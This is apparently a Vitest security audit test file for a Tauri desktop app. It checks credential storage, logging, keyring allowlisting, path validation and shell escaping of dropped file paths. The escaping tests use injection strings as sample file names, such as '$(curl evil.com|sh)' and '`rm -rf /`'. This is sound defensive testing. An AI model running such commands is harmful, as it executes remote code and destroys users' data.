/**
 * Security Audit Tests
 *
 * Validates that security-sensitive patterns are followed correctly:
 * - AWS credentials are never stored in SQLite or localStorage
 * - Drag-and-drop paths are shell-escaped
 * - Keyring keys are allowlisted
 * - Provider settings schema has no secret columns
 */
import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";

/**
 * Recursively collect all source files (TS/TSX/RS) from a directory.
 */
function collectSourceFiles(dir: string, exts: string[]): string[] {
  const files: string[] = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name === "node_modules" || entry.name === "target" || entry.name === "dist") continue;
      files.push(...collectSourceFiles(fullPath, exts));
    } else if (exts.some((ext) => entry.name.endsWith(ext))) {
      files.push(fullPath);
    }
  }
  return files;
}

const ROOT = path.resolve(__dirname, "../..");

describe("credential storage security", () => {
  it("SQLite schema does not contain secret columns", () => {
    const dbService = fs.readFileSync(
      path.join(ROOT, "src/services/database-service.ts"),
      "utf-8"
    );

    // Find all CREATE TABLE statements
    const createTableBlocks = dbService.match(
      /CREATE TABLE IF NOT EXISTS[\s\S]*?\)/g
    );
    expect(createTableBlocks).not.toBeNull();

    const secretPatterns = [
      "access_key",
      "secret_key",
      "session_token",
      "password",
      "credential",
      "aws_access",
      "aws_secret",
    ];

    for (const block of createTableBlocks!) {
      for (const pattern of secretPatterns) {
        expect(
          block.toLowerCase(),
          `Found secret-like column "${pattern}" in SQLite schema:\n${block}`
        ).not.toContain(pattern);
      }
    }
  });

  it("localStorage never stores credentials", () => {
    const tsFiles = collectSourceFiles(path.join(ROOT, "src"), [".ts", ".tsx"]);

    for (const file of tsFiles) {
      // Skip test files
      if (file.includes("__tests__") || file.includes("__test-utils__") || file.includes(".test.")) continue;

      const content = fs.readFileSync(file, "utf-8");
      const lines = content.split("\n");

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i].toLowerCase();
        if (line.includes("localstorage.setitem") || line.includes("sessionstorage.setitem")) {
          // Check surrounding context (5 lines before and after) for credential keywords
          const context = lines.slice(Math.max(0, i - 5), Math.min(lines.length, i + 6)).join("\n").toLowerCase();
          const hasCredential = ["secret", "access_key", "credential", "password", "aws_secret"].some(
            (kw) => context.includes(kw)
          );
          expect(
            hasCredential,
            `Possible credential storage in localStorage at ${file}:${i + 1}`
          ).toBe(false);
        }
      }
    }
  });

  it("no console.log/info/debug statements output credentials", () => {
    const tsFiles = collectSourceFiles(path.join(ROOT, "src"), [".ts", ".tsx"]);
    const rsFiles = collectSourceFiles(path.join(ROOT, "src-tauri/src"), [".rs"]);

    const allFiles = [...tsFiles, ...rsFiles];
    const logPatterns = [
      /console\.(log|info|debug)\(.*(?:secret|access_key|password|credential)/i,
      /println!\(.*(?:secret|access_key|password|credential)/i,
      /eprintln!\(.*(?:secret|access_key|password|credential)/i,
    ];

    for (const file of allFiles) {
      if (file.includes("__tests__") || file.includes(".test.")) continue;
      const content = fs.readFileSync(file, "utf-8");

      for (const pattern of logPatterns) {
        expect(
          pattern.test(content),
          `Possible credential logging in ${path.relative(ROOT, file)}`
        ).toBe(false);
      }
    }
  });

  it("provider_settings table SELECT never fetches secret fields", () => {
    const dbService = fs.readFileSync(
      path.join(ROOT, "src/services/database-service.ts"),
      "utf-8"
    );

    // Find the SELECT for provider_settings
    const selectMatch = dbService.match(
      /SELECT\s+[\w\s,]+\s+FROM\s+provider_settings/i
    );
    expect(selectMatch).not.toBeNull();

    const selectStatement = selectMatch![0].toLowerCase();
    expect(selectStatement).not.toContain("access_key");
    expect(selectStatement).not.toContain("secret");
    expect(selectStatement).not.toContain("token");
    expect(selectStatement).not.toContain("password");
  });

  it("useProviderSettings saves secrets to keyring, not SQLite", () => {
    const hook = fs.readFileSync(
      path.join(ROOT, "src/hooks/useProviderSettings.ts"),
      "utf-8"
    );

    // saveProviderSettings (SQLite) must NOT include secret fields
    const saveCallMatch = hook.match(
      /saveProviderSettings\(\{[\s\S]*?\}\)/
    );
    expect(saveCallMatch).not.toBeNull();

    const saveCall = saveCallMatch![0];
    expect(saveCall).not.toContain("awsAccessKeyId");
    expect(saveCall).not.toContain("awsSecretAccessKey");
    expect(saveCall).not.toContain("awsSessionToken");

    // Secrets must be saved via save_keyring_secret
    expect(hook).toContain('save_keyring_secret');
    expect(hook).toContain('aws_access_key_id');
    expect(hook).toContain('aws_secret_access_key');
    expect(hook).toContain('aws_session_token');
  });
});

describe("drag-and-drop shell escaping", () => {
  // Extract the shell escape logic from App.tsx and verify it
  const shellEscape = (p: string) => "'" + p.replace(/'/g, "'\\''") + "'";

  it("escapes paths with spaces", () => {
    expect(shellEscape("/path/to/my file.txt")).toBe("'/path/to/my file.txt'");
  });

  it("escapes paths with backticks", () => {
    expect(shellEscape("`rm -rf /`.txt")).toBe("'`rm -rf /`.txt'");
  });

  it("escapes paths with dollar signs and command substitution", () => {
    expect(shellEscape("$(curl evil.com|sh).txt")).toBe("'$(curl evil.com|sh).txt'");
  });

  it("escapes paths with double quotes", () => {
    expect(shellEscape('file "name".txt')).toBe("'file \"name\".txt'");
  });

  it("escapes paths with semicolons", () => {
    expect(shellEscape("; rm -rf /;.txt")).toBe("'; rm -rf /;.txt'");
  });

  it("escapes paths with single quotes (the tricky case)", () => {
    // Single quotes inside single-quoted strings need special handling
    const result = shellEscape("it's a file.txt");
    expect(result).toBe("'it'\\''s a file.txt'");
    // When the shell interprets this, it becomes: it's a file.txt
  });

  it("handles empty path", () => {
    expect(shellEscape("")).toBe("''");
  });

  it("handles normal path without special chars", () => {
    expect(shellEscape("/home/user/project/file.rs")).toBe("'/home/user/project/file.rs'");
  });

  it("App.tsx uses shellEscape for drag-and-drop paths", () => {
    const appSource = fs.readFileSync(
      path.join(ROOT, "src/App.tsx"),
      "utf-8"
    );
    // Verify the old unsafe pattern is gone
    expect(appSource).not.toContain('p.includes(" ") ? `"${p}"` : p');
    // Verify shell escaping is present
    expect(appSource).toContain("shellEscape");
    expect(appSource).toContain("replace(/'/g");
  });
});

describe("Rust keyring key allowlist", () => {
  it("settings.rs defines an allowlist for keyring keys", () => {
    const settingsRs = fs.readFileSync(
      path.join(ROOT, "src-tauri/src/commands/settings.rs"),
      "utf-8"
    );

    expect(settingsRs).toContain("ALLOWED_KEYRING_KEYS");
    expect(settingsRs).toContain("validate_keyring_key");

    // All three keyring commands must call validate_keyring_key
    const saveKeyringFn = settingsRs.match(
      /pub fn save_keyring_secret[\s\S]*?(?=\n#\[tauri::command\]|\nfn |\n$)/
    );
    expect(saveKeyringFn?.[0]).toContain("validate_keyring_key");

    const getKeyringFn = settingsRs.match(
      /pub fn get_keyring_secret[\s\S]*?(?=\n#\[tauri::command\]|\nfn |\n$)/
    );
    expect(getKeyringFn?.[0]).toContain("validate_keyring_key");

    const deleteKeyringFn = settingsRs.match(
      /pub fn delete_keyring_secret[\s\S]*?(?=\n#\[tauri::command\]|\nfn |\n$)/
    );
    expect(deleteKeyringFn?.[0]).toContain("validate_keyring_key");
  });

  it("dead get_provider_env_vars has been removed", () => {
    const settingsRs = fs.readFileSync(
      path.join(ROOT, "src-tauri/src/commands/settings.rs"),
      "utf-8"
    );

    // This function would return secrets to the frontend — it must not exist
    expect(settingsRs).not.toContain("get_provider_env_vars");
    // The HashMap import for that function should also be gone
    expect(settingsRs).not.toContain("use std::collections::HashMap");
  });
});

describe("Rust project_path validation", () => {
  it("spawn_terminal validates project_path is a directory", () => {
    const terminalRs = fs.readFileSync(
      path.join(ROOT, "src-tauri/src/commands/terminal.rs"),
      "utf-8"
    );

    // Must validate before spawning
    expect(terminalRs).toContain("is_dir()");
    expect(terminalRs).toContain("Invalid project path");
  });
});

describe("Rust initial_command restriction", () => {
  it("initial_command is only processed for Claude sessions", () => {
    const terminalRs = fs.readFileSync(
      path.join(ROOT, "src-tauri/src/commands/terminal.rs"),
      "utf-8"
    );

    // The filter should ensure initial_command is only used with Claude
    expect(terminalRs).toContain("filter(|_| is_claude_session)");
  });
});

describe("Rust skill path traversal validation", () => {
  it("check_skills_installed validates skill IDs", () => {
    const skillsRs = fs.readFileSync(
      path.join(ROOT, "src-tauri/src/commands/skills.rs"),
      "utf-8"
    );

    // Find the check_skills_installed function — look for the validation block
    const fnStart = skillsRs.indexOf("pub fn check_skills_installed");
    expect(fnStart).toBeGreaterThan(-1);

    // Get enough of the function body to cover the validation
    const fnBody = skillsRs.slice(fnStart, fnStart + 600);

    // Must check for path traversal characters — same validation as install/uninstall
    expect(fnBody).toContain("id.is_empty()");
    expect(fnBody).toContain("path traversal");
  });
});
